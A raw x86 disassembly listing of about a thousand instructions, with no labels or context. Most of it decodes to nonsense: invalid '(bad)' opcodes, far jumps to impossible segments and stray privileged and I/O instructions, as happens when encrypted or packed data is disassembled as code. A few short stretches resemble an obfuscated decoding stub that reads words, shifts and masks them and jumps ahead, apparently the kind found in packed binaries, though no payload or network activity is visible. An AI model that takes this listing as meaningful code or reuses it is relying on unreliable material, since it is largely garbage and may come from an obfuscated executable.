  403c52:	or     DWORD PTR [ecx+0x73a70528],0x7c
  403c59:	(bad)  
  403c5b:	push   0x2e
  403c5d:	dec    edi
  403c5e:	jecxz  0x403c26
  403c60:	mov    ah,bh
  403c62:	shr    bl,1
  403c64:	cmc    
  403c65:	rcr    DWORD PTR [eax-0x5f43d0e9],1
  403c6b:	jp     0x403bfb
  403c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c6e:	fdivp  st(7),st
  403c70:	leave  
  403c71:	mov    esi,0xf54a6b05
  403c76:	adc    DWORD PTR [esi+0x38],ecx
  403c79:	mov    cl,0x0
  403c7c:	sbb    dl,0x18
  403c7f:	mov    bl,0x2
  403c81:	xlat   BYTE PTR ds:[ebx]
  403c82:	cs (bad) 
  403c84:	popf   
  403c85:	sbb    ah,BYTE PTR [ecx+0xc50a5ca]
  403c8b:	imul   esi,ebp,0xfffffffe
  403c8e:	push   ebx
  403c8f:	es push 0x47a5161
  403c95:	sbb    DWORD PTR [eax+ebp*2-0x17],esp
  403c99:	sbb    al,0x91
  403c9b:	out    0x79,eax
  403c9d:	jmp    0x403c45
  403c9f:	pusha  
  403ca0:	pop    eax
  403ca1:	pop    es
  403ca2:	xchg   BYTE PTR [edx+ebx*4],bl
  403ca5:	xor    dl,BYTE PTR [esp+eiz*8]
  403ca8:	call   0xa7105ae6
  403cad:	imul   edi,esp,0xfbb149b
  403cb3:	rol    BYTE PTR [eax],cl
  403cb5:	and    eax,DWORD PTR [esi+0x7d92f0b5]
  403cbb:	int3   
  403cbc:	jge    0x403d18
  403cbe:	out    0xb0,al
  403cc0:	aad    0xff
  403cc2:	retf   
  403cc3:	jno    0x403ca8
  403cc5:	jl     0x403cde
  403cc7:	mov    edi,0x7da19d9b
  403ccc:	sahf   
  403ccd:	or     cl,BYTE PTR [edi]
  403ccf:	pop    edx
  403cd0:	jmp    0xa7a8:0xdf15a885
  403cd7:	not    DWORD PTR [ecx]
  403cd9:	pop    ds
  403cda:	loope  0x403cc1
  403cdc:	cmp    BYTE PTR [edx+0x6af20095],ah
  403ce2:	fist   DWORD PTR [ebp+0x29]
  403ce5:	jne    0x403cf6
  403ce7:	inc    ebx
  403ce8:	xchg   edi,eax
  403ce9:	gs push 0xfafdaff4
  403cef:	loope  0x403cc1
  403cf1:	(bad)  
  403cf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cf3:	jno    0x403d0d
  403cf5:	mov    dh,0xcd
  403cf7:	ins    DWORD PTR es:[edi],dx
  403cf8:	or     eax,0x1cd947a7
  403cfd:	mov    ch,0x4d
  403cff:	mov    esi,0x81029de9
  403d04:	jmp    0x5156:0xf8c88bd
  403d0b:	xor    eax,0xfb3fc26a
  403d10:	repz inc ecx
  403d12:	into   
  403d13:	mov    edx,0x50e9141e
  403d18:	fwait
  403d19:	adc    BYTE PTR [esi+0x3d],bh
  403d1c:	inc    eax
  403d1d:	dec    esp
  403d1e:	mov    esi,0xd6cbb4ed
  403d23:	sbb    ebx,ebp
  403d25:	xchg   ebx,eax
  403d26:	fwait
  403d27:	mov    al,0xec
  403d29:	cmp    ah,cl
  403d2b:	outs   dx,BYTE PTR ds:[esi]
  403d2c:	stc    
  403d2d:	add    esi,DWORD PTR [ebx]
  403d2f:	int    0x20
  403d31:	and    ebx,DWORD PTR [edi+edi*1-0x71e4d94e]
  403d38:	cmc    
  403d39:	push   ss
  403d3a:	dec    ebp
  403d3b:	shl    BYTE PTR [ecx],1
  403d3d:	das    
  403d3e:	rol    DWORD PTR [ebp+0x7fd42b07],1
  403d44:	jo     0x403d00
  403d46:	sub    DWORD PTR [edi],ebp
  403d48:	into   
  403d49:	and    DWORD PTR [eax+0x71a6f2da],esp
  403d4f:	pop    esi
  403d50:	repnz push edi
  403d52:	loope  0x403dce
  403d54:	or     DWORD PTR ds:0x54d4e59c,edi
  403d5a:	rol    BYTE PTR ds:0x84a346bf,1
  403d60:	sub    DWORD PTR [esi+0x4cfd2cda],eax
  403d66:	leave  
  403d67:	pop    esi
  403d68:	mov    dl,bl
  403d6a:	cdq    
  403d6b:	sub    eax,0x45e0219f
  403d70:	shr    bh,1
  403d72:	sub    al,0x66
  403d74:	add    ecx,edi
  403d76:	jp     0x403dd4
  403d78:	add    al,0xb6
  403d7a:	sub    eax,DWORD PTR [eax+0x5d]
  403d7d:	sub    BYTE PTR [esi+ecx*2+0x325c4b40],0x14
  403d85:	or     BYTE PTR [eax],al
  403d87:	stc    
  403d88:	mov    edi,DWORD PTR [edi+0x3244957c]
  403d8e:	adc    bh,BYTE PTR [eax-0x4e]
  403d91:	mov    esp,0xbd8cf624
  403d96:	sub    ah,BYTE PTR gs:[esi+0x2b]
  403d9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d9b:	pop    esi
  403d9c:	xchg   ecx,eax
  403d9d:	jns    0x403da9
  403d9f:	aad    0x1a
  403da1:	mov    edx,0x65495a5d
  403da6:	sti    
  403da7:	test   al,0xa0
  403da9:	xchg   DWORD PTR [eax+esi*4+0x2b],esp
  403dad:	push   0xffffff88
  403daf:	iret   
  403db0:	lds    ecx,FWORD PTR [edx+0x6d]
  403db3:	or     esi,DWORD PTR [esi]
  403db5:	adc    DWORD PTR [ecx],ecx
  403db7:	mov    edx,0xba02bebf
  403dbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dbd:	jne    0x403dd9
  403dbf:	push   esi
  403dc0:	ror    BYTE PTR [edx+0x6d],cl
  403dc3:	bound  edi,QWORD PTR [eax+0xf1cb720]
  403dc9:	ret    0x801f
  403dcc:	(bad)  
  403dcd:	repz jb 0x403dae
  403dd0:	lock mov eax,0x3b3b9194
  403dd6:	lahf   
  403dd7:	(bad)  
  403dd8:	in     al,0xb2
  403dda:	push   ebp
  403ddb:	stos   BYTE PTR es:[edi],al
  403ddc:	lods   eax,DWORD PTR ds:[esi]
  403ddd:	add    ah,al
  403ddf:	imul   ebx,DWORD PTR [ebx],0x8da08e23
  403de5:	aad    0x76
  403de7:	or     esp,ebx
  403de9:	je     0x403d73
  403deb:	adc    eax,0xd869388b
  403df0:	scas   al,BYTE PTR es:[edi]
  403df1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403df2:	dec    edx
  403df3:	idiv   DWORD PTR [ebx+0x5fa31c8]
  403df9:	fisttp QWORD PTR [ecx-0x5b]
  403dfc:	enter  0x544,0xf9
  403e00:	push   es
  403e01:	sysenter 
  403e03:	adc    al,0x7c
  403e05:	pop    ecx
  403e06:	aaa    
  403e07:	retf   0x5d5f
  403e0a:	pushf  
  403e0b:	and    eax,0x5484dfd6
  403e10:	xor    DWORD PTR [edx],ebp
  403e12:	cmp    BYTE PTR [eax+eiz*4-0x2013da67],ah
  403e19:	lds    esp,FWORD PTR [eax]
  403e1b:	mov    cl,0x72
  403e1d:	inc    edi
  403e1e:	xor    ah,BYTE PTR [edx+0x11fccbf6]
  403e24:	sub    bh,BYTE PTR [ebp+0x2b]
  403e27:	rol    BYTE PTR [edx+0x6f],0xc2
  403e2b:	add    eax,0x39bdc13
  403e30:	call   0xcfc16dbd
  403e35:	xor    bl,bh
  403e37:	mov    WORD PTR [edi+0x3189f733],ds
  403e3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e3e:	and    ebx,esp
  403e40:	shr    DWORD PTR [ecx],cl
  403e42:	and    BYTE PTR [eax+0x56f5747a],ah
  403e48:	mov    ebx,0xfbdada98
  403e4d:	test   eax,0xe75a90ec
  403e52:	bound  eax,QWORD PTR ds:0x8d4e9876
  403e58:	dec    ebx
  403e59:	pushf  
  403e5a:	(bad)  
  403e5b:	pushf  
  403e5c:	jecxz  0x403df6
  403e5e:	pushf  
  403e5f:	xor    al,0x7e
  403e61:	adc    BYTE PTR [edi+0x1b],0x66
  403e65:	push   esp
  403e66:	scas   eax,DWORD PTR es:[edi]
  403e67:	mov    DWORD PTR [ebp+0x612a4eba],esi
  403e6d:	lods   eax,DWORD PTR ds:[esi]
  403e6e:	push   ebx
  403e6f:	lods   eax,DWORD PTR ds:[esi]
  403e70:	xor    DWORD PTR [esi+0x54],eax
  403e73:	sar    BYTE PTR [ebx-0x39],0x23
  403e77:	mov    WORD PTR [ecx],?
  403e79:	ret    0xfdf
  403e7c:	inc    esp
  403e7d:	xchg   edi,eax
  403e7e:	adc    al,0xbc
  403e80:	push   ecx
  403e81:	jp     0x403e30
  403e83:	repnz mov ds:0xb4e76ebf,eax
  403e89:	sub    BYTE PTR [ebx-0x7b80b3a5],cl
  403e8f:	fwait
  403e90:	pop    es
  403e91:	push   es
  403e92:	inc    DWORD PTR [ecx-0x7dd48d69]
  403e98:	xchg   esp,eax
  403e99:	pop    edi
  403e9a:	fcomip st,st(1)
  403e9c:	inc    edx
  403e9d:	mov    ah,0xa0
  403e9f:	jnp    0x403e86
  403ea1:	xchg   BYTE PTR [ecx+0x78],ah
  403ea4:	adc    eax,0x8e430048
  403ea9:	pop    eax
  403eaa:	ret    
  403eab:	pop    edi
  403eac:	cmp    edx,edx
  403eae:	jnp    0x403ea4
  403eb0:	pop    edi
  403eb1:	out    0xd5,eax
  403eb3:	test   esi,0xfaf6ae53
  403eb9:	call   0x91235856
  403ebe:	dec    edx
  403ebf:	sub    edx,DWORD PTR [esi+0x1b]
  403ec2:	shl    dh,0x5b
  403ec5:	jmp    0xcf52be09
  403eca:	add    eax,0xb8c539d9
  403ecf:	outs   dx,BYTE PTR ds:[esi]
  403ed0:	mov    ebp,0x645f3579
  403ed5:	pop    esi
  403ed6:	pop    ss
  403ed7:	mov    WORD PTR [ecx+esi*4+0x5f47c39b],fs
  403ede:	mov    WORD PTR [edx+0x663392b8],ss
  403ee4:	mov    ebp,0xf02be2fc
  403ee9:	dec    edx
  403eea:	out    0x33,eax
  403eec:	mov    WORD PTR [esi],cs
  403eee:	push   ecx
  403eef:	pop    esp
  403ef0:	std    
  403ef1:	mov    dl,0x73
  403ef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ef4:	ror    BYTE PTR [edi],0x94
  403ef7:	cwde   
  403ef8:	push   edi
  403ef9:	aaa    
  403efa:	sbb    esp,DWORD PTR [ecx]
  403efc:	ja     0x403ed6
  403efe:	jns    0x403f07
  403f00:	sub    al,0xbd
  403f02:	jno    0x403f6d
  403f04:	shr    DWORD PTR [edx-0x11ffb3dc],cl
  403f0a:	in     al,0x3
  403f0c:	add    DWORD PTR [ecx],ebx
  403f0e:	sbb    eax,0x4281ef
  403f13:	mov    DWORD PTR [ebp-0x14],eax
  403f16:	mov    ecx,DWORD PTR [ebx]
  403f18:	mov    eax,DWORD PTR [ebx+0x4]
  403f1b:	mov    edx,DWORD PTR ds:0x42826f
  403f21:	mov    edx,DWORD PTR [edx]
  403f23:	add    DWORD PTR ds:0x4283fb,edx
  403f29:	shrd   ecx,eax,0x2
  403f2d:	sub    edx,0x9bd
  403f33:	shr    eax,0x2
  403f36:	and    eax,eax
  403f38:	mov    eax,DWORD PTR [ebx]
  403f3a:	and    DWORD PTR ds:0x4282b7,0x5c10
  403f44:	jmp    0x404322
  403f49:	sub    DWORD PTR [ecx-0x65e52424],0xffffff82
  403f50:	and    esi,esi
  403f52:	sbb    BYTE PTR [ecx+0x8fccabc],ch
  403f58:	push   0xffffffce
  403f5a:	xlat   BYTE PTR ds:[ebx]
  403f5b:	sbb    BYTE PTR [eax],bl
  403f5d:	sahf   
  403f5e:	adc    bl,BYTE PTR [eax]
  403f60:	sbb    BYTE PTR [edi+0x1128cdd0],dh
  403f66:	rcr    DWORD PTR [edx-0x21767b3e],cl
  403f6c:	inc    ecx
  403f6d:	push   edx
  403f6e:	fnsave [ecx]
  403f70:	out    0xd8,al
  403f72:	push   edx
  403f73:	nop
  403f74:	mov    esi,DWORD PTR [edx]
  403f76:	test   DWORD PTR [ebx+edi*4+0x6f79f38a],esi
  403f7d:	setb   BYTE PTR [edx-0x26387cd7]
  403f84:	pop    esi
  403f85:	jno    0x403fe0
  403f87:	xor    eax,0x4e63b626
  403f8c:	and    DWORD PTR [esi-0x5],esi
  403f8f:	bound  esp,QWORD PTR [esi+0x33d2f8b6]
  403f95:	mov    al,0xe5
  403f97:	add    DWORD PTR [ecx+0x3167630],edi
  403f9d:	retf   
  403f9e:	and    eax,0x357e98ec
  403fa3:	jb     0x403f9f
  403fa5:	jno    0x404021
  403fa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fa8:	mov    ebp,0x395c0fa4
  403fad:	fistp  QWORD PTR [ebp-0x1142c2ba]
  403fb3:	into   
  403fb4:	and    al,BYTE PTR [eax-0x4a]
  403fb7:	imul   esp,DWORD PTR ss:[ecx-0x2e],0x6c
  403fbc:	mov    esp,0xc1301d
  403fc1:	pop    ss
  403fc2:	push   ebp
  403fc3:	outs   dx,DWORD PTR ds:[esi]
  403fc4:	cli    
  403fc5:	cmp    al,0x61
  403fc7:	mov    esi,0x5804cfd8
  403fcc:	adc    ecx,edx
  403fce:	shl    DWORD PTR [edi+ebp*8+0x6],1
  403fd2:	and    DWORD PTR [ecx+0x74],0xffffffe2
  403fd6:	mov    ecx,0x789158cc
  403fdb:	mov    edx,DWORD PTR [ecx]
  403fdd:	lods   al,BYTE PTR ds:[esi]
  403fde:	dec    edi
  403fdf:	out    0xf2,al
  403fe1:	cmp    al,0xec
  403fe3:	dec    ecx
  403fe4:	repnz (bad) 
  403fe6:	jo     0x404006
  403fe8:	hlt    
  403fe9:	add    ebp,ecx
  403feb:	bound  ebp,QWORD PTR [ebp+0x242ada64]
  403ff1:	(bad)  
  403ff2:	push   ebp
  403ff3:	lods   eax,DWORD PTR ds:[esi]
  403ff4:	and    al,0x8c
  403ff6:	stos   BYTE PTR es:[edi],al
  403ff7:	sar    eax,1
  403ff9:	dec    edx
  403ffa:	pop    esp
  403ffb:	outs   dx,DWORD PTR ds:[esi]
  403ffc:	add    al,0x17
  403ffe:	mov    ds:0xf77b6507,al
  404003:	div    DWORD PTR [esi+0x4b]
  404006:	mov    ebx,0x335c0831
  40400b:	xchg   edx,eax
  40400c:	mov    ecx,0x2c520d19
  404011:	jae    0x404087
  404013:	es dec edx
  404015:	xor    eax,DWORD PTR [ecx]
  404017:	loope  0x404075
  404019:	xor    esi,DWORD PTR [edx-0x39cbf016]
  40401f:	stos   DWORD PTR es:[edi],eax
  404020:	inc    ebx
  404021:	mov    edi,0x8f8a7198
  404026:	(bad)  
  404027:	(bad)  
  404028:	xor    al,0xcf
  40402a:	inc    edi
  40402b:	lods   eax,DWORD PTR ds:[esi]
  40402c:	fst    DWORD PTR [edx-0x7e]
  40402f:	inc    ebx
  404030:	sub    DWORD PTR [eax+0x2024ad8f],eax
  404036:	inc    eax
  404037:	cmp    ecx,DWORD PTR [edi+ecx*1]
  40403a:	pusha  
  40403b:	mov    ah,0x9e
  40403d:	es push cs
  40403f:	inc    ecx
  404040:	(bad)  
  404041:	jl     0x404013
  404043:	mov    ch,0xd6
  404045:	mov    al,0x4d
  404047:	cmp    eax,0xb86d2d4d
  40404c:	lea    ecx,[ebp-0x42236d49]
  404052:	inc    edi
  404053:	add    DWORD PTR [ecx],ebp
  404055:	in     eax,dx
  404056:	out    dx,al
  404057:	sbb    eax,0xd70a5167
  40405c:	inc    ebx
  40405d:	and    cl,ch
  40405f:	add    bh,BYTE PTR [ebx-0x3a606766]
  404065:	mov    ch,0xb7
  404067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404068:	je     0x404017
  40406a:	jg     0x403ff0
  40406c:	mul    bl
  40406e:	(bad)  
  40406f:	xchg   edx,eax
  404070:	out    dx,eax
  404071:	pushw  ds
  404073:	pop    ss
  404074:	mov    bl,BYTE PTR ds:0x28593b3d
  40407a:	adc    al,0x7b
  40407c:	push   ebx
  40407d:	add    eax,0x4a541b64
  404082:	ret    
  404083:	push   cs
  404084:	push   es
  404085:	test   eax,0xf2b35f55
  40408a:	imul   edx,DWORD PTR gs:[esi+0x4d6c05c9],0x1
  404092:	neg    bl
  404094:	out    0xe,eax
  404096:	popa   
  404097:	cld    
  404098:	xchg   esi,eax
  404099:	sub    DWORD PTR [ecx],ecx
  40409b:	retf   0xac58
  40409e:	gs and al,0x46
  4040a1:	pop    ebp
  4040a2:	jmp    0x144e:0x46e79a8c
  4040a9:	adc    ebp,DWORD PTR [ecx-0x60]
  4040ac:	jno    0x40406a
  4040ae:	fcom   DWORD PTR [edx]
  4040b0:	sbb    BYTE PTR [ebp+ebp*8+0x685fd8ee],0x2b
  4040b8:	popf   
  4040b9:	xchg   esi,ebp
  4040bb:	lods   al,BYTE PTR ds:[esi]
  4040bc:	adc    DWORD PTR [esi],esi
  4040be:	popa   
  4040bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040c0:	clc    
  4040c1:	jb     0x40405a
  4040c3:	nop
  4040c4:	jecxz  0x4040ca
  4040c6:	mov    ah,0x56
  4040c8:	mov    BYTE PTR [ebx+0x34aabd8d],dh
  4040ce:	(bad)  
  4040cf:	and    ebp,DWORD PTR [ebx+0x3f]
  4040d2:	sar    BYTE PTR [ecx],0xec
  4040d5:	paddd  mm6,QWORD PTR [eax-0x4c135d77]
  4040dc:	mov    esi,0x9ddd232f
  4040e1:	add    esp,DWORD PTR [edx]
  4040e3:	xor    ah,dh
  4040e5:	sahf   
  4040e6:	fs ins BYTE PTR es:[edi],dx
  4040e8:	xlat   BYTE PTR ds:[ebx]
  4040e9:	mov    ds:0x9bd6c01d,al
  4040ee:	cmp    bl,bl
  4040f0:	(bad)  
  4040f1:	mov    ah,0xd3
  4040f3:	dec    ecx
  4040f4:	push   esi
  4040f5:	mov    eax,0xd0204452
  4040fa:	stos   BYTE PTR es:[di],al
  4040fc:	ret    
  4040fd:	retf   
  4040fe:	aaa    
  4040ff:	icebp  
  404100:	sbb    ah,bh
  404102:	xchg   esp,eax
  404103:	pop    esi
  404104:	cmp    eax,0xb9217852
  404109:	push   es
  40410a:	out    0x1e,eax
  40410c:	pop    ecx
  40410d:	mov    esp,0x43775aeb
  404112:	mov    dh,0xbe
  404114:	(bad)  [ecx+0x19]
  404117:	xor    dh,BYTE PTR [ebp-0x3b25d805]
  40411d:	push   ebx
  40411e:	ja     0x4040af
  404120:	pop    edx
  404121:	cli    
  404122:	dec    esi
  404123:	fdiv   DWORD PTR [ecx]
  404125:	mov    BYTE PTR [edx+ebx*4],dl
  404128:	xchg   edx,eax
  404129:	mov    BYTE PTR [edx+0x5c],bh
  40412c:	xor    al,0xe
  40412e:	test   al,0x15
  404130:	mov    bl,0x1
  404132:	rcl    BYTE PTR [edi],0xaf
  404135:	pop    edi
  404136:	div    DWORD PTR [ebp-0x46]
  404139:	dec    esi
  40413a:	mov    BYTE PTR [ebx],dh
  40413c:	push   esi
  40413d:	retf   0x1e32
  404140:	arpl   WORD PTR [ecx],si
  404142:	aas    
  404143:	enter  0x4732,0xb5
  404147:	mov    edi,0xf33a7eb1
  40414c:	ja     0x404151
  40414e:	bound  ecx,QWORD PTR [eax-0x2]
  404151:	(bad)  
  404152:	(bad)  [esi]
  404154:	fiadd  WORD PTR ss:[esi+edx*8-0x33]
  404159:	pop    ebp
  40415a:	mov    WORD PTR ds:0x4e6661b7,cs
  404160:	lock jno 0x4041ac
  404163:	int3   
  404164:	test   DWORD PTR [ebx+0x4b07d01a],esp
  40416a:	cmp    ecx,0x1213cb42
  404170:	xchg   DWORD PTR [edx],edi
  404172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404173:	int    0x89
  404175:	ja     0x404181
  404177:	add    eax,0x863c4aff
  40417c:	adc    BYTE PTR [edx],al
  40417e:	scas   eax,DWORD PTR es:[edi]
  40417f:	ss pop edi
  404181:	jmp    0xc906:0xc6b48fc4
  404188:	inc    eax
  404189:	or     DWORD PTR [ebp+0x6],edx
  40418c:	loop   0x40414a
  40418e:	sub    eax,0x51f6fd1d
  404193:	ret    
  404194:	(bad)  
  404195:	mov    eax,0x989d060d
  40419a:	xor    esi,DWORD PTR [esi-0x60b0861e]
  4041a0:	jp     0x4041d5
  4041a2:	and    eax,0x787a3660
  4041a7:	nop
  4041a8:	js     0x404219
  4041aa:	lahf   
  4041ab:	gs es xchg edi,eax
  4041ae:	sub    esi,DWORD PTR [ecx+0x73]
  4041b1:	pop    esp
  4041b2:	xor    ebx,DWORD PTR [eax+0x1e57288b]
  4041b8:	inc    ecx
  4041b9:	and    BYTE PTR [ecx-0x6e],al
  4041bc:	sbb    cl,BYTE PTR [ecx-0x7eeaef60]
  4041c2:	and    esp,DWORD PTR [esi+0x65bebcf2]
  4041c8:	cmp    al,0x69
  4041ca:	sub    edx,DWORD PTR [edx-0x30]
  4041cd:	pop    ecx
  4041ce:	mov    ah,0x48
  4041d0:	aam    0xc8
  4041d2:	and    eax,0x4330fdba
  4041d7:	and    ecx,DWORD PTR [ecx+0x7c]
  4041da:	mov    esi,0x2174ccaf
  4041df:	cli    
  4041e0:	jmp    0x404189
  4041e2:	loopne 0x404184
  4041e4:	shl    BYTE PTR [esp+ecx*2-0xe],0xac
  4041e9:	cmp    esi,esi
  4041eb:	gs jns 0x404260
  4041ee:	lahf   
  4041ef:	cmp    al,0x89
  4041f1:	pushf  
  4041f2:	dec    edi
  4041f3:	scas   al,BYTE PTR es:[edi]
  4041f4:	fwait
  4041f5:	iret   
  4041f6:	inc    ebx
  4041f7:	sub    DWORD PTR [esi-0x54],0x46
  4041fb:	ret    
  4041fc:	sbb    BYTE PTR [eax+0x55c86884],ah
  404202:	sub    al,0x12
  404204:	mov    ds:0xf7c39618,al
  404209:	pop    ds
  40420a:	jbe    0x404242
  40420c:	add    edx,DWORD PTR [edx+0x2c]
  40420f:	fldcw  WORD PTR [esp+eax*1+0x4]
  404213:	lea    esp,[edi]
  404215:	ret    0x1d7a
  404218:	in     al,0x7d
  40421a:	xchg   DWORD PTR [ebx],ebx
  40421c:	lds    esp,FWORD PTR [ecx]
  40421e:	loopne 0x404219
  404220:	out    dx,al
  404221:	in     al,0xb5
  404223:	cmp    edx,DWORD PTR [ebx+0xfc75308]
  404229:	mov    edi,0x67260221
  40422e:	jmp    0x404213
  404230:	pop    eax
  404231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404232:	mov    BYTE PTR [esi-0x7bb44dd2],dl
  404238:	mov    bh,0xd5
  40423a:	das    
  40423b:	cdq    
  40423c:	retf   0x2d29
  40423f:	out    0xd6,eax
  404241:	aas    
  404242:	test   BYTE PTR [edi-0x47],0x34
  404246:	mov    al,ds:0x5baf6ae3
  40424b:	bound  eax,QWORD PTR [esi-0x5924fb8a]
  404251:	mov    ebx,0xf6cd0fe7
  404256:	mov    dl,0xe6
  404258:	aas    
  404259:	pop    esi
  40425a:	es aaa 
  40425c:	sub    eax,0xde378415
  404261:	(bad)  
  404262:	and    bl,BYTE PTR [esi]
  404264:	mov    ss,eax
  404266:	mov    ch,0xe6
  404268:	sub    esp,eax
  40426a:	repz not ah
  40426d:	push   esi
  40426e:	call   0xed8bd060
  404273:	jne    0x4042b1
  404275:	dec    esi
  404276:	rcr    BYTE PTR [ebp+0x79],1
  404279:	push   0xb6dee79
  40427e:	inc    ecx
  40427f:	lea    edi,[esi-0x7fd5cce6]
  404285:	fwait
  404286:	enter  0x62e0,0x37
  40428a:	jno    0x404292
  40428c:	mov    edx,esi
  40428e:	stos   BYTE PTR es:[edi],al
  40428f:	push   ecx
  404290:	bound  edi,QWORD PTR [ecx]
  404292:	les    ebx,FWORD PTR [esi+0x1072cab8]
  404298:	mov    dl,0xf6
  40429a:	test   eax,0xde45207d
  40429f:	adc    ah,BYTE PTR [eax-0x3b]
  4042a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042a3:	mov    edx,0x653c1be9
  4042a8:	pusha  
  4042a9:	sbb    ecx,DWORD PTR [ecx+edi*1+0x53cf2ab9]
  4042b0:	inc    BYTE PTR [eax+ebp*4+0x5d]
  4042b4:	out    dx,eax
  4042b5:	jnp    0x4042fb
  4042b7:	fdivr  DWORD PTR [ebx-0x385b306b]
  4042bd:	xor    edi,DWORD PTR [eax+0x64]
  4042c0:	ins    DWORD PTR es:[edi],dx
  4042c1:	push   es
  4042c2:	add    al,0xbd
  4042c4:	lock sbb BYTE PTR [edi],0x0
  4042c8:	mov    al,ds:0xbc778039
  4042cd:	add    esp,DWORD PTR [esi+0x60]
  4042d0:	dec    ebp
  4042d1:	mov    dl,0xcf
  4042d3:	outs   dx,DWORD PTR ds:[esi]
  4042d4:	and    DWORD PTR ds:[edi-0x2a162395],eax
  4042db:	fldcw  WORD PTR [ebx]
  4042dd:	ret    0xf60b
  4042e0:	push   esp
  4042e1:	bound  esi,QWORD PTR [ebp+0x51]
  4042e4:	ror    DWORD PTR [ecx+0x4a],1
  4042e7:	jp     0x4042f7
  4042e9:	in     eax,dx
  4042ea:	xor    ecx,DWORD PTR [ecx+ebp*1+0x414a22e8]
  4042f1:	push   es
  4042f2:	xor    DWORD PTR [eax+0x51feebac],edx
  4042f8:	cli    
  4042f9:	ficomp DWORD PTR [eax]
  4042fb:	xchg   edx,eax
  4042fc:	loope  0x4042ee
  4042fe:	jecxz  0x4042db
  404300:	jecxz  0x404352
  404302:	cmp    al,0xc7
  404304:	fbstp  TBYTE PTR [esi+ecx*1]
  404307:	mov    ch,0xb6
  404309:	jne    0x4042aa
  40430b:	xchg   edi,eax
  40430c:	sub    ecx,DWORD PTR [edx-0x38]
  40430f:	or     edi,esi
  404311:	xor    DWORD PTR [ebx+eiz*2+0x43eee1ca],edi
  404318:	loope  0x404317
  40431a:	xchg   ebx,eax
  40431b:	arpl   WORD PTR [esi+0x5232a168],cx
  404321:	jg     0x4042ae
  404323:	push   ebx
  404324:	add    al,0x21
  404326:	sbb    eax,0x4282bb
  40432b:	xor    ecx,edi
  40432d:	or     edx,DWORD PTR ds:0x4282eb
  404333:	shl    eax,0x1e
  404336:	and    edx,DWORD PTR ds:0x428367
  40433c:	xor    eax,eax
  40433e:	mov    edx,DWORD PTR ds:0x4282a7
  404344:	and    DWORD PTR ds:0x428407,edx
  40434a:	or     eax,ecx
  40434c:	mov    ecx,DWORD PTR [ebx]
  40434e:	movzx  edx,BYTE PTR ds:0x4283ef
  404355:	sbb    DWORD PTR ds:0x4282fb,edx
  40435b:	mov    edx,DWORD PTR [ebx+0x4]
  40435e:	jmp    0x40473c
  404363:	xchg   BYTE PTR [eax+ebp*4],ch
  404366:	xchg   edx,eax
  404367:	call   0x1412:0x951c227a
  40436e:	stos   BYTE PTR es:[edi],al
  40436f:	sub    bl,BYTE PTR [ecx]
  404371:	mov    bh,0x7c
  404373:	push   ebp
  404374:	iret   
  404375:	sbb    BYTE PTR [eax],bl
  404377:	sahf   
  404378:	adc    bl,BYTE PTR [eax]
  40437a:	sbb    BYTE PTR [edi],dh
  40437c:	ficomp WORD PTR [eax-0x390faf20]
  404382:	push   eax
  404383:	ins    BYTE PTR es:[edi],dx
  404384:	xchg   BYTE PTR [esi-0x6fe1a1c1],ah
  40438a:	mov    ebp,ecx
  40438c:	cmp    BYTE PTR [edx+0xa],ah
  40438f:	dec    ebx
  404390:	xchg   edx,eax
  404391:	loop   0x404322
  404393:	test   DWORD PTR [ecx+0x3a],esi
  404396:	and    al,0xaf
  404398:	fmul   st(4),st
  40439a:	repnz push ds
  40439c:	cwde   
  40439d:	sbb    BYTE PTR [esi],0x35
  4043a0:	xchg   DWORD PTR [edi-0x7ad9722f],ebp
  4043a6:	dec    ebx
  4043a7:	sbb    cl,BYTE PTR [esi-0x3a7b3825]
  4043ad:	cs sahf 
  4043af:	sbb    eax,0x24540f4f
  4043b4:	ret    
  4043b5:	inc    edx
  4043b6:	call   0x86e9:0xb7a9dfbc
  4043bd:	outs   dx,BYTE PTR ds:[esi]
  4043be:	ins    DWORD PTR es:[edi],dx
  4043bf:	ss pop edx
  4043c1:	mov    ah,0x92
  4043c3:	fsubr  QWORD PTR [esi]
  4043c5:	xor    al,0x4f
  4043c7:	outs   dx,DWORD PTR ds:[esi]
  4043c8:	lea    esi,[edi+0xbd26248]
  4043ce:	(bad)
  4043d1:	cmp    eax,0xbcf15607
  4043d6:	add    eax,0x8244486f
  4043db:	ins    BYTE PTR es:[edi],dx
  4043dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043dd:	pop    ss
  4043de:	fmul   QWORD PTR [ebx-0x58]
  4043e1:	jg     0x404386
  4043e3:	cmp    eax,0x1f0c6c3
  4043e8:	jle    0x40436e
  4043ea:	pop    edx
  4043eb:	(bad)  
  4043ed:	clc    
  4043ee:	ret    
  4043ef:	or     bh,BYTE PTR [ecx+ebx*1]
  4043f2:	adc    eax,DWORD PTR [ebp-0x57]
  4043f5:	(bad)  
  4043f6:	in     al,dx
  4043f7:	inc    esi
  4043f8:	and    dl,0x3d
  4043fb:	fimul  DWORD PTR [bp+si]
  4043fe:	jae    0x404439
  404400:	sbb    al,0x6d
  404402:	fucom  st(6)
  404404:	dec    ecx
  404405:	(bad)  
  404406:	xchg   ebp,eax
  404407:	gs je  0x4043b7
  40440a:	xchg   DWORD PTR [ecx-0x4f73bb1c],eax
  404410:	xchg   edx,eax
  404411:	repz out 0x7c,al
  404414:	add    esp,eax
  404416:	mov    al,0xaa
  404418:	pop    ebx
  404419:	inc    eax
  40441a:	xchg   ebx,eax
  40441b:	lahf   
  40441c:	mov    esp,0xeed39f3b
  404421:	add    bh,BYTE PTR [ebx]
  404423:	clc    
  404424:	imul   eax,DWORD PTR [esi-0x61ec4daf],0xffffffaf
  40442b:	aas    
  40442c:	xor    al,0x46
  40442e:	mov    eax,0xb807fbe0
  404433:	cli    
